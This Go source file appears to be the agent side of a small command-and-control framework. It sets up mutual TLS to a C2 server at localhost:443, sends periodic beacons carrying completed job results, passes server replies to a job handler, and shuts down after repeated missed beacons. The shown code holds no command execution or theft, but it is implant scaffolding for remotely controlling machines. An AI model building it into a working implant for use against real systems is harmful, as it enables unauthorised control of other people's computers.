package agent

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/joe-broder15/supertrooper/internal/messages"
)

// AgentState holds parameters and configuration for the agent.
type AgentState struct {
	// Certificates for TLS communication.
	caCertPEM    []byte
	agentCertPEM []byte
	agentKeyPEM  []byte

	// TLS configuration for mTLS communication with the server.
	tlsConfig *tls.Config

	// C2 server address to connect to.
	serverAddr string

	// Unique identifier for this agent.
	agentID string

	// Persistence flag.
	persist bool

	// Maximum number of consecutive communication failures allowed.
	missesBeforeDeath int

	// Time intervals for beaconing and keepalive communication with the server (in seconds).
	beaconInterval int

	// Completed jobs.
	completedJobs []messages.JobRsp
}

// newAgentState initializes and returns a new instance of AgentState.
func newAgentState(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte, serverAddr string) *AgentState {
	return &AgentState{
		caCertPEM:         caCertPEM,
		agentCertPEM:      agentCertPEM,
		agentKeyPEM:       agentKeyPEM,
		tlsConfig:         initTLSConfig(caCertPEM, agentCertPEM, agentKeyPEM),
		serverAddr:        serverAddr,
		agentID:           "none",
		persist:           false,
		missesBeforeDeath: 3,
		beaconInterval:    10,
		completedJobs:     []messages.JobRsp{},
	}
}

// initTLSConfig creates a new TLS configuration using the provided certificates.
// Exits the process via log.Fatalf if an error occurs.
func initTLSConfig(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) *tls.Config {
	// Load the agent's certificate and key for client identity.
	agentCert, err := tls.X509KeyPair(agentCertPEM, agentKeyPEM)
	if err != nil {
		log.Fatalf("agent: error loading key pair: %v", err)
	}

	// Create a CA pool with the provided CA certificate to verify the server.
	caCertPool := x509.NewCertPool()
	if ok := caCertPool.AppendCertsFromPEM(caCertPEM); !ok {
		log.Fatal("agent: failed to append CA certificate")
	}

	// Configure mTLS settings for the client.
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{agentCert},
		RootCAs:      caCertPool,
		MinVersion:   tls.VersionTLS12,
	}
	return tlsConfig
}

// connectToC2 opens a TLS connection to the given C2 server.
func connectToC2(agentState *AgentState) (*tls.Conn, error) {

	// connect to server and get socket
	conn, err := tls.Dial("tcp", agentState.serverAddr, agentState.tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("agent: error dialing server: %w", err)
	}

	// set a deadline for the connection
	conn.SetDeadline(time.Now().Add(time.Second * 20))
	return conn, nil
}

// build a beacon request for the server
func buildBeaconReq(agentState *AgentState) (messages.BeaconReq, error) {

	// Build and send a BeaconReq message using the new beacon structure.
	beaconReq := messages.BeaconReq{
		AgentInfo: messages.AgentInfo{
			AgentID:           agentState.agentID,
			BeaconInterval:    agentState.beaconInterval,
			MissesBeforeDeath: agentState.missesBeforeDeath,
			NextBeacon:        int(time.Now().Unix() + int64(agentState.beaconInterval)),
			Persist:           agentState.persist,
		},
		Errors: 0,                        // initial error count
		JobRsp: agentState.completedJobs, // no job responses initially
	}

	return beaconReq, nil
}

// sends a beacon to the server
func sendAndReceiveBeacon(agentState *AgentState) (messages.BeaconRsp, error) {

	conn, err := connectToC2(agentState)
	if err != nil {
		return messages.BeaconRsp{}, fmt.Errorf("agent: error connecting to server: %w", err)
	}

	defer conn.Close()

	encoder := json.NewEncoder(conn)
	decoder := json.NewDecoder(conn)

	// build the beacon request
	beaconReq, err := buildBeaconReq(agentState)
	if err != nil {
		return messages.BeaconRsp{}, fmt.Errorf("agent: error building beacon request: %w", err)
	}

	// send the beacon request
	if err := encoder.Encode(beaconReq); err != nil {
		return messages.BeaconRsp{}, fmt.Errorf("agent: error sending beacon request: %w", err)
	}

	// Receive a response from the server and decode it as BeaconRsp.
	var beaconRsp messages.BeaconRsp
	if err := decoder.Decode(&beaconRsp); err != nil {
		return messages.BeaconRsp{}, fmt.Errorf("agent: error decoding beacon response: %w", err)
	}

	return beaconRsp, nil
}

// routine that runs when the agent dies
func die() {
	log.Println("agent: dying")
	os.Exit(0)
}

// Start is the entry point for the agent. It initializes the state and
// enters a loop to repeatedly beacon the server.
func Start(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) {
	fmt.Println("starting agent as mTLS client using raw TLS sockets")

	agentState := newAgentState(caCertPEM, agentCertPEM, agentKeyPEM, "localhost:443")

	missedBeacons := 0

	// beacon every beaconInterval seconds until maxMisses is reached
	for missedBeacons < agentState.missesBeforeDeath {

		log.Println("agent: beaconing to server")
		beaconRsp, err := sendAndReceiveBeacon(agentState)
		if err != nil {
			log.Println("agent: error sending beacon request: ", err)
			missedBeacons++
		} else {
			missedBeacons = 0
			// process the beacon response
			processBeaconRsp(beaconRsp, agentState)
		}

		log.Println("agent: sleeping for ", agentState.beaconInterval, " seconds")
		time.Sleep(time.Duration(agentState.beaconInterval) * time.Second)
	}

	if missedBeacons >= agentState.missesBeforeDeath {
		die()
	}
}
